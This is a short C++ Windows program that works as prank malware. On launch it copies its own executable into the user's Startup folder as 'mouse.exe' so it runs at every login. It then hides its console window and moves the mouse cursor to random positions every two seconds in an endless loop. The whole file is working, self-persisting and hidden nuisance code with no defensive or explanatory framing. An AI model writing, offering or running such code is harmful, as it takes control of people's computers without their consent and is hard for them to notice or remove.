#include <Windows.h>
#include <ctime>
#include <cstdlib>
#include <fstream>
using namespace std;

string username = getenv("username");
string startup = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

int main(int argc, char **argv)
{
    string cpfile = startup + "\\" + "mouse.exe";
    ifstream tf(argv[0], ios::binary);
    ofstream sf(cpfile, ios::binary);
    sf << tf.rdbuf();
    tf.close();
    sf.close();
    HWND Console = GetConsoleWindow();
    ShowWindow(Console, SW_HIDE);
    COORD coord;
    while (true)
    {
        srand(time(0));
        coord.X = rand() % 1000;
        coord.Y = rand() % 1000;
        SetCursorPos(coord.X, coord.Y);
        Sleep(2000);
    }
    return 0;
}